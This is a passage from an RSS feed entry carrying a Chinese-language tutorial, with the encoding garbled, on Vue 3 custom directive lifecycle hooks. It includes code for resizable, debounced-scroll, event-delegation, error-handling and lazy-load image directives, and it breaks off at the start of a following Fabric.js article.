        handleEl.<span class="hljs-property">className</span> = <span class="hljs-string">`resize-handle resize-handle-<span class="hljs-subst">${handle}</span>`</span>
        handleEl.<span class="hljs-property">dataset</span>.<span class="hljs-property">handle</span> = handle
        
        <span class="hljs-comment">// æ·»åŠ äº‹ä»¶ç›‘å¬</span>
        handleEl.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousedown'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
          e.<span class="hljs-title function_">preventDefault</span>()
          e.<span class="hljs-title function_">stopPropagation</span>()
          <span class="hljs-title function_">startResize</span>(e, handle, el, instanceOptions)
        })
        
        el.<span class="hljs-title function_">appendChild</span>(handleEl)
        handleElements.<span class="hljs-title function_">push</span>(handleEl)
      })
      
      <span class="hljs-comment">// å­˜å‚¨å¼•ç”¨</span>
      el.<span class="hljs-property">_resizeHandles</span> = handleElements
      el.<span class="hljs-property">_resizeOptions</span> = instanceOptions
      
      <span class="hljs-comment">// æ·»åŠ å¯è°ƒæ•´å¤§å°çš„æ ·å¼</span>
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'resizable'</span>)
    },
    
    <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-comment">// æ›´æ–°é€‰é¡¹</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> binding.<span class="hljs-property">value</span> === <span class="hljs-string">'object'</span>) {
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(el.<span class="hljs-property">_resizeOptions</span>, binding.<span class="hljs-property">value</span>)
      }
    },
    
    <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
      <span class="hljs-comment">// æ¸…ç†æ‰‹æŸ„</span>
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_resizeHandles</span>) {
        el.<span class="hljs-property">_resizeHandles</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">handle</span> =&gt;</span> {
          handle.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mousedown'</span>, handle.<span class="hljs-property">_resizeHandler</span>)
          el.<span class="hljs-title function_">removeChild</span>(handle)
        })
        <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_resizeHandles</span>
      }
      
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_resizeOptions</span>
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'resizable'</span>)
    }
  }
}

<span class="hljs-comment">// è°ƒæ•´å¤§å°é€»è¾‘</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">startResize</span>(<span class="hljs-params">e, handle, el, options</span>) {
  <span class="hljs-keyword">const</span> startX = e.<span class="hljs-property">clientX</span>
  <span class="hljs-keyword">const</span> startY = e.<span class="hljs-property">clientY</span>
  <span class="hljs-keyword">const</span> startWidth = el.<span class="hljs-property">offsetWidth</span>
  <span class="hljs-keyword">const</span> startHeight = el.<span class="hljs-property">offsetHeight</span>
  
  <span class="hljs-comment">// è§¦å‘å¼€å§‹å›è°ƒ</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> options.<span class="hljs-property">onResizeStart</span> === <span class="hljs-string">'function'</span>) {
    options.<span class="hljs-title function_">onResizeStart</span>(e, el, { <span class="hljs-attr">width</span>: startWidth, <span class="hljs-attr">height</span>: startHeight })
  }
  
  <span class="hljs-comment">// é¼ æ ‡ç§»åŠ¨å¤„ç†</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onMouseMove</span> = (<span class="hljs-params">e</span>) =&gt; {
    <span class="hljs-keyword">const</span> deltaX = e.<span class="hljs-property">clientX</span> - startX
    <span class="hljs-keyword">const</span> deltaY = e.<span class="hljs-property">clientY</span> - startY
    
    <span class="hljs-keyword">let</span> newWidth = startWidth
    <span class="hljs-keyword">let</span> newHeight = startHeight
    
    <span class="hljs-comment">// æ ¹æ®æ‰‹æŸ„ç±»å‹è®¡ç®—æ–°å°ºå¯¸</span>
    <span class="hljs-keyword">if</span> (handle.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'right'</span>)) {
      newWidth = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(options.<span class="hljs-property">minWidth</span>, startWidth + deltaX)
      <span class="hljs-keyword">if</span> (options.<span class="hljs-property">maxWidth</span>) {
        newWidth = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(options.<span class="hljs-property">maxWidth</span>, newWidth)
      }
    }
    
    <span class="hljs-keyword">if</span> (handle.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'bottom'</span>)) {
      newHeight = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(options.<span class="hljs-property">minHeight</span>, startHeight + deltaY)
      <span class="hljs-keyword">if</span> (options.<span class="hljs-property">maxHeight</span>) {
        newHeight = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(options.<span class="hljs-property">maxHeight</span>, newHeight)
      }
    }
    
    <span class="hljs-comment">// åº”ç”¨æ–°å°ºå¯¸</span>
    el.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">`<span class="hljs-subst">${newWidth}</span>px`</span>
    el.<span class="hljs-property">style</span>.<span class="hljs-property">height</span> = <span class="hljs-string">`<span class="hljs-subst">${newHeight}</span>px`</span>
    
    <span class="hljs-comment">// è§¦å‘è°ƒæ•´å›è°ƒ</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> options.<span class="hljs-property">onResize</span> === <span class="hljs-string">'function'</span>) {
      options.<span class="hljs-title function_">onResize</span>(e, el, { <span class="hljs-attr">width</span>: newWidth, <span class="hljs-attr">height</span>: newHeight })
    }
  }
  
  <span class="hljs-comment">// é¼ æ ‡æŠ¬èµ·å¤„ç†</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onMouseUp</span> = (<span class="hljs-params">e</span>) =&gt; {
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mousemove'</span>, onMouseMove)
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mouseup'</span>, onMouseUp)
    
    <span class="hljs-comment">// è§¦å‘ç»“æŸå›è°ƒ</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> options.<span class="hljs-property">onResizeEnd</span> === <span class="hljs-string">'function'</span>) {
      options.<span class="hljs-title function_">onResizeEnd</span>(e, el, {
        <span class="hljs-attr">width</span>: el.<span class="hljs-property">offsetWidth</span>,
        <span class="hljs-attr">height</span>: el.<span class="hljs-property">offsetHeight</span>
      })
    }
  }
  
  <span class="hljs-comment">// æ·»åŠ å…¨å±€äº‹ä»¶ç›‘å¬</span>
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousemove'</span>, onMouseMove)
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseup'</span>, onMouseUp)
}

<span class="hljs-comment">// åˆ›å»ºä¸åŒé…ç½®çš„æŒ‡ä»¤</span>
<span class="hljs-keyword">const</span> vResizable = <span class="hljs-title function_">createResizableDirective</span>()
<span class="hljs-keyword">const</span> vResizableHorizontal = <span class="hljs-title function_">createResizableDirective</span>({ <span class="hljs-attr">handles</span>: [<span class="hljs-string">'right'</span>] })
<span class="hljs-keyword">const</span> vResizableVertical = <span class="hljs-title function_">createResizableDirective</span>({ <span class="hljs-attr">handles</span>: [<span class="hljs-string">'bottom'</span>] })

<span class="hljs-comment">// ç”¨æ³•ç¤ºä¾‹</span>
<span class="hljs-comment">// &lt;div v-resizable&gt;å¯è°ƒæ•´å¤§å°&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-resizable="{ minWidth: 200, maxWidth: 800, onResize: handleResize }"&gt;</span>
<span class="hljs-comment">// &lt;div v-resizable.horizontal&gt;ä»…æ°´å¹³è°ƒæ•´&lt;/div&gt;</span>
</code></pre>
<h3 data-id="heading-16">äº”ã€æœ€ä½³å®è·µä¸æ³¨æ„äº‹é¡¹</h3>
<h4 data-id="heading-17">5.1 æ€§èƒ½ä¼˜åŒ–</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. ä½¿ç”¨é˜²æŠ–å’ŒèŠ‚æµ</span>
<span class="hljs-keyword">import</span> { debounce, throttle } <span class="hljs-keyword">from</span> <span class="hljs-string">'lodash'</span>

<span class="hljs-keyword">const</span> vScrollOptimized = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> handler = binding.<span class="hljs-property">value</span>
    
    <span class="hljs-comment">// ä½¿ç”¨é˜²æŠ–</span>
    <span class="hljs-keyword">const</span> debouncedHandler = <span class="hljs-title function_">debounce</span>(handler, <span class="hljs-number">300</span>, {
      <span class="hljs-attr">leading</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">trailing</span>: <span class="hljs-literal">true</span>
    })
    
    <span class="hljs-comment">// ä½¿ç”¨èŠ‚æµ</span>
    <span class="hljs-keyword">const</span> throttledHandler = <span class="hljs-title function_">throttle</span>(handler, <span class="hljs-number">100</span>)
    
    el.<span class="hljs-property">_scrollHandler</span> = binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">debounce</span> 
      ? debouncedHandler
      : binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">throttle</span>
        ? throttledHandler
        : handler
    
    el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, el.<span class="hljs-property">_scrollHandler</span>)
  },
  
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
    el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'scroll'</span>, el.<span class="hljs-property">_scrollHandler</span>)
  }
}

<span class="hljs-comment">// 2. äº‹ä»¶å§”æ‰˜</span>
<span class="hljs-keyword">const</span> vEventDelegation = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> eventType = binding.<span class="hljs-property">arg</span> || <span class="hljs-string">'click'</span>
    <span class="hljs-keyword">const</span> selector = binding.<span class="hljs-property">value</span>.<span class="hljs-property">selector</span>
    <span class="hljs-keyword">const</span> handler = binding.<span class="hljs-property">value</span>.<span class="hljs-property">handler</span>
    
    el.<span class="hljs-property">_delegationHandler</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
      <span class="hljs-comment">// æ£€æŸ¥äº‹ä»¶ç›®æ ‡æ˜¯å¦åŒ¹é…é€‰æ‹©å™¨</span>
      <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-title function_">matches</span>(selector) || e.<span class="hljs-property">target</span>.<span class="hljs-title function_">closest</span>(selector)) {
        <span class="hljs-title function_">handler</span>(e)
      }
    }
    
    el.<span class="hljs-title function_">addEventListener</span>(eventType, el.<span class="hljs-property">_delegationHandler</span>)
  },
  
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
    el.<span class="hljs-title function_">removeEventListener</span>(binding.<span class="hljs-property">arg</span> || <span class="hljs-string">'click'</span>, el.<span class="hljs-property">_delegationHandler</span>)
  }
}

<span class="hljs-comment">// 3. æŒ‡ä»¤å¤ç”¨</span>
<span class="hljs-comment">// åˆ›å»ºå¯å¤ç”¨çš„åŸºç¡€æŒ‡ä»¤</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">baseDirective</span> = (<span class="hljs-params">customHooks = {}</span>) =&gt; ({
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding, vnode</span>) {
    <span class="hljs-comment">// å…¬å…±å‰ç½®é€»è¾‘</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æŒ‡ä»¤ç»‘å®šåˆ°å…ƒç´ :'</span>, el.<span class="hljs-property">tagName</span>)
    
    <span class="hljs-comment">// è°ƒç”¨è‡ªå®šä¹‰é’©å­</span>
    <span class="hljs-keyword">if</span> (customHooks.<span class="hljs-property">beforeMount</span>) {
      customHooks.<span class="hljs-title function_">beforeMount</span>(el, binding, vnode)
    }
  },
  
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding, vnode</span>) {
    <span class="hljs-comment">// å…¬å…±é€»è¾‘</span>
    el.<span class="hljs-property">dataset</span>.<span class="hljs-property">directiveMounted</span> = <span class="hljs-string">'true'</span>
    
    <span class="hljs-comment">// è°ƒç”¨è‡ªå®šä¹‰é’©å­</span>
    <span class="hljs-keyword">if</span> (customHooks.<span class="hljs-property">mounted</span>) {
      customHooks.<span class="hljs-title function_">mounted</span>(el, binding, vnode)
    }
  },
  
  <span class="hljs-comment">// ... å…¶ä»–é’©å­</span>
})

<span class="hljs-comment">// åˆ›å»ºç‰¹å®šæŒ‡ä»¤</span>
<span class="hljs-keyword">const</span> vCustomDirective = <span class="hljs-title function_">baseDirective</span>({
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// ç‰¹å®šé€»è¾‘</span>
    el.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = binding.<span class="hljs-property">value</span>
  }
})
</code></pre>
<h4 data-id="heading-18">5.2 é”™è¯¯å¤„ç†</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æŒ‡ä»¤é”™è¯¯å¤„ç†</span>
<span class="hljs-keyword">const</span> vSafeDirective = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// å¯èƒ½å‡ºé”™çš„æ“ä½œ</span>
      <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(binding.<span class="hljs-property">value</span>)
      el.<span class="hljs-property">_parsedData</span> = result
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-comment">// é”™è¯¯å¤„ç†</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æŒ‡ä»¤æ‰§è¡Œé”™è¯¯:'</span>, error)
      
      <span class="hljs-comment">// æ˜¾ç¤ºé”™è¯¯çŠ¶æ€</span>
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'directive-error'</span>)
      el.<span class="hljs-property">title</span> = <span class="hljs-string">`æŒ‡ä»¤é”™è¯¯: <span class="hljs-subst">${error.message}</span>`</span>
      
      <span class="hljs-comment">// è§¦å‘é”™è¯¯äº‹ä»¶</span>
      el.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'directive-error'</span>, {
        <span class="hljs-attr">detail</span>: { error, binding }
      }))
    }
  },
  
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// æ£€æŸ¥å€¼æ˜¯å¦æœ‰æ•ˆ</span>
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">value</span> === <span class="hljs-literal">undefined</span> || binding.<span class="hljs-property">value</span> === <span class="hljs-literal">null</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'æŒ‡ä»¤æ¥æ”¶åˆ°æ— æ•ˆå€¼'</span>)
      <span class="hljs-keyword">return</span>
    }
    
    <span class="hljs-comment">// ç»§ç»­æ‰§è¡Œ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">mounted</span>(el, binding)
  },
  
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
    <span class="hljs-comment">// æ¸…ç†</span>
    el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'directive-error'</span>)
    <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_parsedData</span>
  }
}
</code></pre>
<h3 data-id="heading-19">å…­ã€æ€»ç»“</h3>
<h4 data-id="heading-20">6.1 ç”Ÿå‘½å‘¨æœŸé’©å­å…³é”®ç‚¹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è®°å¿†å£è¯€</span>
<span class="hljs-keyword">const</span> directiveLifecycle = <span class="hljs-string">`
å£è¯€ä¸€ï¼š
æŒ‚è½½å‰å‡†å¤‡ï¼ˆbeforeMountï¼‰
æŒ‚è½½åæ‰§è¡Œï¼ˆmountedï¼‰
æ›´æ–°å‰æ£€æŸ¥ï¼ˆbeforeUpdateï¼‰
æ›´æ–°åå“åº”ï¼ˆupdatedï¼‰
å¸è½½å‰æ¸…ç†ï¼ˆbeforeUnmountï¼‰
å¸è½½åé‡Šæ”¾ï¼ˆunmountedï¼‰

å£è¯€äºŒï¼š
ç»‘å®šçœ‹ beforeMount + mounted
æ›´æ–°çœ‹ beforeUpdate + updated
è§£ç»‘çœ‹ beforeUnmount + unmounted

å£è¯€ä¸‰ï¼š
Vue2 è½¬ Vue3ï¼š
bind â†’ beforeMount
inserted â†’ mounted
update â†’ beforeUpdate
componentUpdated â†’ updated
unbind â†’ beforeUnmount + unmounted
`</span>

<span class="hljs-comment">// ä½¿ç”¨å»ºè®®</span>
<span class="hljs-keyword">const</span> bestPractices = <span class="hljs-string">`
1. åœ¨ mounted ä¸­æ“ä½œ DOM
2. åœ¨ updated ä¸­å“åº”æ•°æ®å˜åŒ–
3. åœ¨ beforeUnmount/unmounted ä¸­æ¸…ç†èµ„æº
4. ä½¿ç”¨æŒ‡ä»¤å‚æ•°å’Œä¿®é¥°ç¬¦å¢å¼ºåŠŸèƒ½
5. è€ƒè™‘æ€§èƒ½ï¼Œåˆç†ä½¿ç”¨äº‹ä»¶ç›‘å¬
6. ä¿æŒæŒ‡ä»¤çš„å•ä¸€èŒè´£
7. æ·»åŠ é”™è¯¯å¤„ç†
8. æä¾›æ¸…ç†å‡½æ•°é¿å…å†…å­˜æ³„æ¼
`</span>
</code></pre>
<h4 data-id="heading-21">6.2 å®Œæ•´ç¤ºä¾‹ï¼šå›¾ç‰‡æ‡’åŠ è½½æŒ‡ä»¤</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> vLazyLoad = {
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// åˆå§‹åŒ–</span>
    el.<span class="hljs-property">_lazyLoadObserver</span> = <span class="hljs-literal">null</span>
    el.<span class="hljs-property">_lazyLoadSrc</span> = binding.<span class="hljs-property">value</span>
    el.<span class="hljs-property">_lazyLoadOptions</span> = {
      <span class="hljs-attr">root</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">rootMargin</span>: <span class="hljs-string">'50px'</span>,
      <span class="hljs-attr">threshold</span>: <span class="hljs-number">0.1</span>,
      ...(<span class="hljs-keyword">typeof</span> binding.<span class="hljs-property">value</span> === <span class="hljs-string">'object'</span> ? binding.<span class="hljs-property">value</span>.<span class="hljs-property">options</span> : {})
    }
  },
  
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// è®¾ç½®å ä½ç¬¦</span>
    <span class="hljs-keyword">const</span> placeholder = el.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-src'</span>) || <span class="hljs-string">'/placeholder.jpg'</span>
    el.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'src'</span>, placeholder)
    
    <span class="hljs-comment">// è·å–çœŸå®å›¾ç‰‡åœ°å€</span>
    <span class="hljs-keyword">const</span> src = <span class="hljs-keyword">typeof</span> binding.<span class="hljs-property">value</span> === <span class="hljs-string">'string'</span> 
      ? binding.<span class="hljs-property">value</span> 
      : binding.<span class="hljs-property">value</span>.<span class="hljs-property">src</span>
    
    <span class="hljs-comment">// å¦‚æœå›¾ç‰‡å·²ç»åœ¨è§†çª—å†…ï¼Œç›´æ¥åŠ è½½</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isElementInViewport</span>(el)) {
      <span class="hljs-title function_">loadImage</span>(el, src)
      <span class="hljs-keyword">return</span>
    }
    
    <span class="hljs-comment">// ä½¿ç”¨ IntersectionObserver æ‡’åŠ è½½</span>
    <span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntersectionObserver</span>(<span class="hljs-function">(<span class="hljs-params">entries</span>) =&gt;</span> {
      entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">isIntersecting</span>) {
          <span class="hljs-title function_">loadImage</span>(el, src)
          observer.<span class="hljs-title function_">unobserve</span>(el)
        }
      })
    }, el.<span class="hljs-property">_lazyLoadOptions</span>)
    
    observer.<span class="hljs-title function_">observe</span>(el)
    el.<span class="hljs-property">_lazyLoadObserver</span> = observer
  },
  
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// å¦‚æœå›¾ç‰‡åœ°å€å˜åŒ–</span>
    <span class="hljs-keyword">const</span> newSrc = <span class="hljs-keyword">typeof</span> binding.<span class="hljs-property">value</span> === <span class="hljs-string">'string'</span> 
      ? binding.<span class="hljs-property">value</span> 
      : binding.<span class="hljs-property">value</span>.<span class="hljs-property">src</span>
    
    <span class="hljs-keyword">if</span> (newSrc !== el.<span class="hljs-property">_lazyLoadSrc</span>) {
      <span class="hljs-comment">// åœæ­¢è§‚å¯Ÿ</span>
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_lazyLoadObserver</span>) {
        el.<span class="hljs-property">_lazyLoadObserver</span>.<span class="hljs-title function_">unobserve</span>(el)
        el.<span class="hljs-property">_lazyLoadObserver</span> = <span class="hljs-literal">null</span>
      }
      
      <span class="hljs-comment">// é‡æ–°è®¾ç½®</span>
      el.<span class="hljs-property">_lazyLoadSrc</span> = newSrc
      
      <span class="hljs-comment">// å¦‚æœå·²ç»åœ¨è§†çª—å†…ï¼Œç›´æ¥åŠ è½½</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isElementInViewport</span>(el)) {
        <span class="hljs-title function_">loadImage</span>(el, newSrc)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// é‡æ–°è§‚å¯Ÿ</span>
        <span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntersectionObserver</span>(<span class="hljs-function">(<span class="hljs-params">entries</span>) =&gt;</span> {
          entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
            <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">isIntersecting</span>) {
              <span class="hljs-title function_">loadImage</span>(el, newSrc)
              observer.<span class="hljs-title function_">unobserve</span>(el)
            }
          })
        }, el.<span class="hljs-property">_lazyLoadOptions</span>)
        
        observer.<span class="hljs-title function_">observe</span>(el)
        el.<span class="hljs-property">_lazyLoadObserver</span> = observer
      }
    }
  },
  
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
    <span class="hljs-comment">// æ¸…ç† IntersectionObserver</span>
    <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_lazyLoadObserver</span>) {
      el.<span class="hljs-property">_lazyLoadObserver</span>.<span class="hljs-title function_">unobserve</span>(el)
      el.<span class="hljs-property">_lazyLoadObserver</span> = <span class="hljs-literal">null</span>
    }
  }
}

<span class="hljs-comment">// å·¥å…·å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isElementInViewport</span>(<span class="hljs-params">el</span>) {
  <span class="hljs-keyword">const</span> rect = el.<span class="hljs-title function_">getBoundingClientRect</span>()
  <span class="hljs-keyword">return</span> (
    rect.<span class="hljs-property">top</span> &lt;= (<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientHeight</span>) &amp;&amp;
    rect.<span class="hljs-property">left</span> &lt;= (<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientWidth</span>) &amp;&amp;
    rect.<span class="hljs-property">bottom</span> &gt;= <span class="hljs-number">0</span> &amp;&amp;
    rect.<span class="hljs-property">right</span> &gt;= <span class="hljs-number">0</span>
  )
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">loadImage</span>(<span class="hljs-params">el, src</span>) {
  <span class="hljs-keyword">const</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>()
  
  img.<span class="hljs-property">onload</span> = <span class="hljs-function">() =&gt;</span> {
    el.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'src'</span>, src)
    el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'loaded'</span>)
    
    <span class="hljs-comment">// è§¦å‘åŠ è½½å®Œæˆäº‹ä»¶</span>
    el.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'lazyloaded'</span>, {
      <span class="hljs-attr">detail</span>: { src, <span class="hljs-attr">element</span>: el }
    }))
  }
  
  img.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`å›¾ç‰‡åŠ è½½å¤±è´¥: <span class="hljs-subst">${src}</span>`</span>)
    el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'error'</span>)
    
    <span class="hljs-comment">// è§¦å‘é”™è¯¯äº‹ä»¶</span>
    el.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'lazyloaderror'</span>, {
      <span class="hljs-attr">detail</span>: { src, <span class="hljs-attr">element</span>: el }
    }))
  }
  
  img.<span class="hljs-property">src</span> = src
}

<span class="hljs-comment">// ç”¨æ³•ç¤ºä¾‹</span>
<span class="hljs-comment">// &lt;img v-lazy-load="'/images/picture.jpg'"&gt;</span>
<span class="hljs-comment">// &lt;img v-lazy-load="{ src: '/images/picture.jpg', options: { rootMargin: '100px' } }"&gt;</span>
</code></pre>
<p><strong>æ ¸å¿ƒè¦ç‚¹ï¼š</strong></p>
<ol>
<li><strong>Vue 3 æŒ‡ä»¤æœ‰ 6 ä¸ªç”Ÿå‘½å‘¨æœŸé’©å­</strong>ï¼šbeforeMountã€mountedã€beforeUpdateã€updatedã€beforeUnmountã€unmounted</li>
<li><strong>æ­£ç¡®é€‰æ‹©é’©å­</strong>ï¼šæ ¹æ®æ“ä½œç±»å‹é€‰æ‹©åˆé€‚çš„æ—¶é—´ç‚¹</li>
<li><strong>èµ„æºç®¡ç†</strong>ï¼šåœ¨å¸è½½é’©å­ä¸­æ¸…ç†äº‹ä»¶ç›‘å¬ã€å®šæ—¶å™¨ã€è§‚å¯Ÿå™¨ç­‰</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šåˆç†ä½¿ç”¨é˜²æŠ–ã€èŠ‚æµã€äº‹ä»¶å§”æ‰˜</li>
<li><strong>é”™è¯¯å¤„ç†</strong>ï¼šå¢å¼ºæŒ‡ä»¤çš„å¥å£®æ€§</li>
</ol>
<p>æŒæ¡æŒ‡ä»¤ç”Ÿå‘½å‘¨æœŸé’©å­ï¼Œä½ å¯ä»¥åˆ›å»ºå¼ºå¤§ã€å¯å¤ç”¨ã€é«˜æ€§èƒ½çš„è‡ªå®šä¹‰æŒ‡ä»¤ï¼Œæå¤§åœ°æ‰©å±• Vue çš„èƒ½åŠ›è¾¹ç•Œï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ¡ˆä¾‹+å›¾è§£å¸¦ä½ é¨æ¸¸ Canvas 2Dç»˜å›¾ Fabric.jsğŸ”¥ğŸ”¥ï¼ˆ5W+å­—ï¼‰]]></title>    <link>https://juejin.cn/post/7595351120668672026</link>    <guid>https://juejin.cn/post/7595351120668672026</guid>    <pubDate>2026-01-15T09:17:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595351120668672026" data-draft-id="7595351120668164122" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ¡ˆä¾‹+å›¾è§£å¸¦ä½ é¨æ¸¸ Canvas 2Dç»˜å›¾ Fabric.jsğŸ”¥ğŸ”¥ï¼ˆ5W+å­—ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,Canvas,JavaScript"/> <meta itemprop="datePublished" content="2026-01-15T09:17:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lsx_"/> <meta itemprop="url" content="https://juejin.cn/user/1442981392682829"/></div> <div itemprop="publisher" itemscope="itemscope" 